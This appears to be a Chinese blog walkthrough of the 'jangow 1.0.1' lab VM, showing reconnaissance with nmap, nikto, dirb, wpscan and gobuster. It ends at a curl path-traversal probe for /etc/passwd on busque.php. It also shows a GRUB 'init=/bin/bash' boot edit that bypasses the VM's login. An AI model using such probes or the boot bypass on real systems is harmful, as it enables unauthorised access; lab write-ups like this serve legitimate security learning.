-  
-
-  
-    <a href="/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/" class="">
-      主流AI定价</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-854542c26bded6389f67b522f4182c5e" class="toggle"  />
-    <label for="section-854542c26bded6389f67b522f4182c5e" class="flex">
-      <a role="button" class="">
-        导航门户</a>
-      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/%E7%BD%91%E5%AE%89/" class="">
-      网安</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
-      论文</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
-      工作</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/Function/" class="">
-      Function</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/AI/" class="">
-      AI</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/Life/" class="">
-      Life</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
-      平台</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
-      机场</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-
-
-
-
-
-
-
-
-
-<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
-
-
-
-
-</nav>
-
-
-
-
-  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
-
-
-
-  </div>
-</aside>
- 
-
-    <div class="book-page">
-      <header class="book-header hidden">
-        
-  <div class="flex align-center justify-between">
-  <label for="menu-control">
-    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
-  </label>
-
-  <h3>jangow 1.0.1</h3>
-
-  <label for="toc-control">
-    
-    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
-    
-  </label>
-</div>
-
-
-  
-  <aside class="hidden">
-    
-  
-<nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#一靶机网卡修复">一、靶机网卡修复</a></li>
-        <li><a href="#二识别靶机ip">二、识别靶机ip</a></li>
-        <li><a href="#三端口扫描nmap">三、端口扫描nmap</a></li>
-        <li><a href="#四获得shell失败">四、获得shell（失败）</a>
-          <ul>
-            <li><a href="#searchsploit">searchsploit</a></li>
-            <li><a href="#ftp">FTP</a></li>
-          </ul>
-        </li>
-        <li><a href="#五http扫描">五、HTTP扫描</a>
-          <ul>
-            <li><a href="#nikto">nikto</a></li>
-            <li><a href="#目录扫描dirb">目录扫描dirb</a></li>
-            <li><a href="#wpscan">wpscan</a></li>
-            <li><a href="#gobuster">gobuster</a></li>
-            <li><a href="#网页url">网页URL</a></li>
-          </ul>
-        </li>
-        <li><a href="#六反弹shell">六、反弹shell</a></li>
-        <li><a href="#七提权">七、提权</a></li>
-        <li><a href="#八总结">八、总结</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-
-
-
-  </aside>
-  
- 
-      </header>
-
-      
-      
-  <article class="markdown book-article"><h2 id="一靶机网卡修复">一、靶机网卡修复<a class="anchor" href="#%e4%b8%80%e9%9d%b6%e6%9c%ba%e7%bd%91%e5%8d%a1%e4%bf%ae%e5%a4%8d">#</a></h2>
-<p>将靶机网络模式修改为<strong>NAT模式</strong>，按<code>shift</code>，选择第二个回车，再选择第二个，按<code>e</code>，删除&quot;recovery nomodeset&quot;并在末尾添加&quot;quiet splash rw init=/bin/bash，<code>ctrl + x</code>在新的红色界面<code>sudo vim /etc/network/interfaces</code>（尽量用tab键补全），将网卡信息修改为<code>ens33</code>，这里键盘映射问题，无法直接输入<code>:wq</code>，所以先大写，按住<code>shift</code>，再双击<code>Z</code>，接着重置</p>
-<h2 id="二识别靶机ip">二、识别靶机ip<a class="anchor" href="#%e4%ba%8c%e8%af%86%e5%88%ab%e9%9d%b6%e6%9c%baip">#</a></h2>
-<p><code>sudo arp-scan -l</code>，靶机ip为<code>192.168.203.136</code></p>
-<h2 id="三端口扫描nmap">三、端口扫描nmap<a class="anchor" href="#%e4%b8%89%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8fnmap">#</a></h2>
-<p>快速扫描</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.203.136
-</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#ff6ac1">(</span> https://nmap.org <span style="color:#ff6ac1">)</span> at 2026-01-28 06:07 EST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff6ac1">for</span> 192.168.203.136
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff6ac1">(</span>0.0035s latency<span style="color:#ff6ac1">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ff9f43">998</span> filtered tcp ports <span style="color:#ff6ac1">(</span>no-response<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18
-</span></span><span style="display:flex;"><span>|_http-title: Index of /
-</span></span><span style="display:flex;"><span>| http-ls: Volume /
-</span></span><span style="display:flex;"><span>| SIZE  TIME              FILENAME
-</span></span><span style="display:flex;"><span>| -     2021-06-10 18:05  site/
-</span></span><span style="display:flex;"><span>|_
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#ff6ac1">(</span>Ubuntu<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:17:B0:6C <span style="color:#ff6ac1">(</span>VMware<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.0.1; OS: Unix</span></span></code></pre></div><h2 id="四获得shell失败">四、获得shell（失败）<a class="anchor" href="#%e5%9b%9b%e8%8e%b7%e5%be%97shell%e5%a4%b1%e8%b4%a5">#</a></h2>
-<h3 id="searchsploit">searchsploit<a class="anchor" href="#searchsploit">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ searchsploit vsFTPd 3.0.3                
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-</span></span><span style="display:flex;"><span> Exploit Title                                                                                                            |  Path
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-</span></span><span style="display:flex;"><span>vsftpd 3.0.3 - Remote Denial of Service                                                                                   | multiple/remote/49719.py
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-</span></span><span style="display:flex;"><span>Shellcodes: No Results</span></span></code></pre></div><p>目标主机FTP版本没有漏洞</p>
-<h3 id="ftp">FTP<a class="anchor" href="#ftp">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ ftp 192.168.203.136
-</span></span><span style="display:flex;"><span>Connected to 192.168.203.136.
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">220</span> <span style="color:#ff6ac1">(</span>vsFTPd 3.0.3<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#ff6ac1">(</span>192.168.203.136:kali<span style="color:#ff6ac1">)</span>: anonymous
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">331</span> Please specify the password.
-</span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">530</span> Login incorrect.
-</span></span><span style="display:flex;"><span>ftp: Login failed
-</span></span><span style="display:flex;"><span>ftp&gt; quit
-</span></span><span style="display:flex;"><span><span style="color:#ff9f43">221</span> Goodbye.</span></span></code></pre></div><p>不允许匿名访问</p>
-<h2 id="五http扫描">五、HTTP扫描<a class="anchor" href="#%e4%ba%94http%e6%89%ab%e6%8f%8f">#</a></h2>
-<h3 id="nikto">nikto<a class="anchor" href="#nikto">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ nikto -h http://192.168.203.136
-</span></span><span style="display:flex;"><span>- Nikto v2.5.0
-</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>+ Target IP:          192.168.203.136
-</span></span><span style="display:flex;"><span>+ Target Hostname:    192.168.203.136
-</span></span><span style="display:flex;"><span>+ Target Port:        <span style="color:#ff9f43">80</span>
-</span></span><span style="display:flex;"><span>+ Start Time:         2026-01-29 03:33:55 <span style="color:#ff6ac1">(</span>GMT-5<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>+ Server: Apache/2.4.18 <span style="color:#ff6ac1">(</span>Ubuntu<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
-</span></span><span style="display:flex;"><span>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
-</span></span><span style="display:flex;"><span>+ /: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ No CGI Directories found <span style="color:#ff6ac1">(</span>use <span style="color:#5af78e">&#39;-C all&#39;</span> to force check all possible <span style="color:#ff5c57">dirs</span><span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>+ Apache/2.4.18 appears to be outdated <span style="color:#ff6ac1">(</span>current is at least Apache/2.4.54<span style="color:#ff6ac1">)</span>. Apache 2.2.34 is the EOL <span style="color:#ff6ac1">for</span> the 2.x branch.
-</span></span><span style="display:flex;"><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
-</span></span><span style="display:flex;"><span>+ /./: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ /./: Appending <span style="color:#5af78e">&#39;/./&#39;</span> to a directory allows indexing.
-</span></span><span style="display:flex;"><span>+ //: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ //: Apache on Red Hat Linux release <span style="color:#ff9f43">9</span> reveals the root directory listing by default <span style="color:#ff6ac1">if</span> there is no index page.
-</span></span><span style="display:flex;"><span>+ /%2e/: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ /%2e/: Weblogic allows <span style="color:#ff5c57">source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513
-</span></span><span style="display:flex;"><span>+ ///: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span style="color:#5af78e">&#39;open directory browsing&#39;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff6ac1">=</span>CVE-1999-0269
-</span></span><span style="display:flex;"><span>+ /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span style="color:#5af78e">&#39;open directory browsing&#39;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff6ac1">=</span>CVE-1999-0269
-</span></span><span style="display:flex;"><span>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /<span style="color:#5af78e">&#39;s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ 8102 requests: 0 error(s) and 17 item(s) reported on remote host
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ End Time:           2026-01-29 03:34:05 (GMT-5) (10 seconds)
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">---------------------------------------------------------------------------
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ 1 host(s) tested
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">┌──(kali㉿kali)-[~]
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">└─$ nikto -h http://192.168.203.136/site/
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">- Nikto v2.5.0
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">---------------------------------------------------------------------------
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ Target IP:          192.168.203.136
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ Target Hostname:    192.168.203.136
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ Target Port:        80
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ Start Time:         2026-01-29 03:39:13 (GMT-5)
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">---------------------------------------------------------------------------
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ Server: Apache/2.4.18 (Ubuntu)
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ /site/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ /site/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
-</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">+ No CGI Directories found (use &#39;</span>-C all<span style="color:#ff5c57">&#39;</span> to force check all possible <span style="color:#ff5c57">dirs</span><span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>+ Apache/2.4.18 appears to be outdated <span style="color:#ff6ac1">(</span>current is at least Apache/2.4.54<span style="color:#ff6ac1">)</span>. Apache 2.2.34 is the EOL <span style="color:#ff6ac1">for</span> the 2.x branch.
-</span></span><span style="display:flex;"><span>+ /site/: Server may leak inodes via ETags, header found with file /site/, inode: 27ce, size: 5c46fbf4bb499, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff6ac1">=</span>CVE-2003-1418
-</span></span><span style="display:flex;"><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
-</span></span><span style="display:flex;"><span>+ /site/css/: Directory indexing found.
-</span></span><span style="display:flex;"><span>+ /site/css/: This might be interesting.
-</span></span><span style="display:flex;"><span>+ <span style="color:#ff9f43">8103</span> requests: <span style="color:#ff9f43">0</span> error<span style="color:#ff6ac1">(</span>s<span style="color:#ff6ac1">)</span> and <span style="color:#ff9f43">7</span> item<span style="color:#ff6ac1">(</span>s<span style="color:#ff6ac1">)</span> reported on remote host
-</span></span><span style="display:flex;"><span>+ End Time:           2026-01-29 03:39:24 <span style="color:#ff6ac1">(</span>GMT-5<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">(</span><span style="color:#ff9f43">11</span> seconds<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>+ <span style="color:#ff9f43">1</span> host<span style="color:#ff6ac1">(</span>s<span style="color:#ff6ac1">)</span> tested</span></span></code></pre></div><h3 id="目录扫描dirb">目录扫描dirb<a class="anchor" href="#%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8fdirb">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ dirb http://192.168.203.136
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-----------------
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                                                                             GENERATED WORDS: <span style="color:#ff9f43">4612</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>---- Scanning URL: http://192.168.203.136/ ----
-</span></span><span style="display:flex;"><span>                                                                             + http://192.168.203.136/server-status <span style="color:#ff6ac1">(</span>CODE:403|SIZE:280<span style="color:#ff6ac1">)</span>                  
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">==</span>&gt; DIRECTORY: http://192.168.203.136/site/
-</span></span><span style="display:flex;"><span>                                                                            
-</span></span><span style="display:flex;"><span>---- Entering directory: http://192.168.203.136/site/ ----
-</span></span><span style="display:flex;"><span>                                                                                                                                                          <span style="color:#ff6ac1">==</span>&gt; DIRECTORY: http://192.168.203.136/site/assets/
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">==</span>&gt; DIRECTORY: http://192.168.203.136/site/css/
-</span></span><span style="display:flex;"><span>+ http://192.168.203.136/site/index.html <span style="color:#ff6ac1">(</span>CODE:200|SIZE:10190<span style="color:#ff6ac1">)</span>              
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">==</span>&gt; DIRECTORY: http://192.168.203.136/site/js/
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">==</span>&gt; DIRECTORY: http://192.168.203.136/site/wordpress/
-</span></span><span style="display:flex;"><span>                                                                            
-</span></span><span style="display:flex;"><span>---- Entering directory: http://192.168.203.136/site/assets/ ----
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">(</span>!<span style="color:#ff6ac1">)</span> WARNING: Directory IS LISTABLE. No need to scan it.
-</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">(</span>Use mode <span style="color:#5af78e">&#39;-w&#39;</span> <span style="color:#ff6ac1">if</span> you want to scan it anyway<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>                                                                            
-</span></span><span style="display:flex;"><span>---- Entering directory: http://192.168.203.136/site/css/ ----
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">(</span>!<span style="color:#ff6ac1">)</span> WARNING: Directory IS LISTABLE. No need to scan it.
-</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">(</span>Use mode <span style="color:#5af78e">&#39;-w&#39;</span> <span style="color:#ff6ac1">if</span> you want to scan it anyway<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>                                                                            
-</span></span><span style="display:flex;"><span>---- Entering directory: http://192.168.203.136/site/js/ ----
-</span></span><span style="display:flex;"><span>                                                                             <span style="color:#ff6ac1">(</span>!<span style="color:#ff6ac1">)</span> WARNING: Directory IS LISTABLE. No need to scan it.
-</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">(</span>Use mode <span style="color:#5af78e">&#39;-w&#39;</span> <span style="color:#ff6ac1">if</span> you want to scan it anyway<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span>                                                                            
-</span></span><span style="display:flex;"><span>---- Entering directory: http://192.168.203.136/site/wordpress/ ----
-</span></span><span style="display:flex;"><span>                                                                             + http://192.168.203.136/site/wordpress/index.html <span style="color:#ff6ac1">(</span>CODE:200|SIZE:10190<span style="color:#ff6ac1">)</span>    
-</span></span><span style="display:flex;"><span>                                                                               
-</span></span><span style="display:flex;"><span>-----------------
-</span></span><span style="display:flex;"><span>END_TIME: Wed Jan <span style="color:#ff9f43">28</span> 06:16:22 <span style="color:#ff9f43">2026</span>
-</span></span><span style="display:flex;"><span>DOWNLOADED: <span style="color:#ff9f43">13836</span> - FOUND: <span style="color:#ff9f43">3</span></span></span></code></pre></div><p>能点的都看看，也没发现特殊的内容，有wordpress目录，访问后，返回的不是典型的wordpress站点，因此用wpscan确认</p>
-<h3 id="wpscan">wpscan<a class="anchor" href="#wpscan">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ wpscan --url http://192.168.203.136/site/wordpress -e u,p
-</span></span><span style="display:flex;"><span>_______________________________________________________________
-</span></span><span style="display:flex;"><span>         __          _______   _____
-</span></span><span style="display:flex;"><span>         <span style="color:#5af78e">\ \ </span>       / /  __ <span style="color:#5af78e">\ </span>/ ____|
-</span></span><span style="display:flex;"><span>          <span style="color:#5af78e">\ \ </span> /<span style="color:#5af78e">\ </span> / /| |__<span style="color:#ff6ac1">)</span> | <span style="color:#ff6ac1">(</span>___   ___  __ _ _ __ ®
-</span></span><span style="display:flex;"><span>           <span style="color:#5af78e">\ \/</span>  <span style="color:#5af78e">\/</span> / |  ___/ <span style="color:#5af78e">\_</span>__ <span style="color:#5af78e">\ </span>/ __|/ _<span style="color:#5af78e">`</span> | <span style="color:#ff5c57">&#39;</span>_ <span style="color:#5af78e">\
-</span></span></span><span style="display:flex;"><span>            <span style="color:#5af78e">\ </span> /<span style="color:#5af78e">\ </span> /  | |     ____<span style="color:#ff6ac1">)</span> | <span style="color:#ff6ac1">(</span>__| <span style="color:#ff6ac1">(</span>_| | | | |
-</span></span><span style="display:flex;"><span>             <span style="color:#5af78e">\/</span>  <span style="color:#5af78e">\/</span>   |_|    |_____/ <span style="color:#5af78e">\_</span>__|<span style="color:#5af78e">\_</span>_,_|_| |_|
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>         WordPress Security Scanner by the WPScan Team
-</span></span><span style="display:flex;"><span>                         Version 3.8.28
-</span></span><span style="display:flex;"><span>       Sponsored by Automattic - https://automattic.com/
-</span></span><span style="display:flex;"><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-</span></span><span style="display:flex;"><span>_______________________________________________________________
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Scan Aborted: The remote website is up, but does not seem to be running WordPress.</span></span></code></pre></div><p>结果表明靶机没用运行wordpress，只是普通的目录</p>
-<h3 id="gobuster">gobuster<a class="anchor" href="#gobuster">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://192.168.203.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
-</span></span><span style="display:flex;"><span>Gobuster v3.8
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff6ac1">(</span>@TheColonial<span style="color:#ff6ac1">)</span> &amp; Christian Mehlmauer <span style="color:#ff6ac1">(</span>@firefart<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Url:                     http://192.168.203.136
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Method:                  GET
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Threads:                 <span style="color:#ff9f43">10</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Negative Status codes:   <span style="color:#ff9f43">404</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> User Agent:              gobuster/3.8
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Extensions:              txt,php,html,js,sh
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>+<span style="color:#ff6ac1">]</span> Timeout:                 <span style="color:#ff5c57">10s</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
-</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration <span style="color:#ff5c57">mode</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
-</span></span><span style="display:flex;"><span>/site                 <span style="color:#ff6ac1">(</span>Status: 301<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 317<span style="color:#ff6ac1">]</span> <span style="color:#ff6ac1">[</span>--&gt; http://192.168.203.136/site/<span style="color:#ff6ac1">]</span>                                                                        
-</span></span><span style="display:flex;"><span>/server-status        <span style="color:#ff6ac1">(</span>Status: 403<span style="color:#ff6ac1">)</span> <span style="color:#ff6ac1">[</span>Size: 280<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>Progress: <span style="color:#ff9f43">1323348</span> / <span style="color:#ff9f43">1323348</span> <span style="color:#ff6ac1">(</span>100.00%<span style="color:#ff6ac1">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Finished</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================</span></span></span></code></pre></div><p>也没有有价值的信息</p>
-<h3 id="网页url">网页URL<a class="anchor" href="#%e7%bd%91%e9%a1%b5url">#</a></h3>
-<p>点击buscar后，提示：<code>http://192.168.203.136/site/busque.php?buscar=</code>，可能是本地包含漏洞、命令执行？
-本地包含漏洞检测：</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>┌──<span style="color:#ff6ac1">(</span>kali㉿kali<span style="color:#ff6ac1">)</span>-<span style="color:#ff6ac1">[</span>~<span style="color:#ff6ac1">]</span>
-</span></span><span style="display:flex;"><span>└─$ curl http://192.168.203.136/site/busque.php?buscar<span style="color:#ff6ac1">=</span>../../../../../../etc/passwd</span></span></code></pre></div><p>没有返回内容</p>
-<p>命令执行检测：</p>
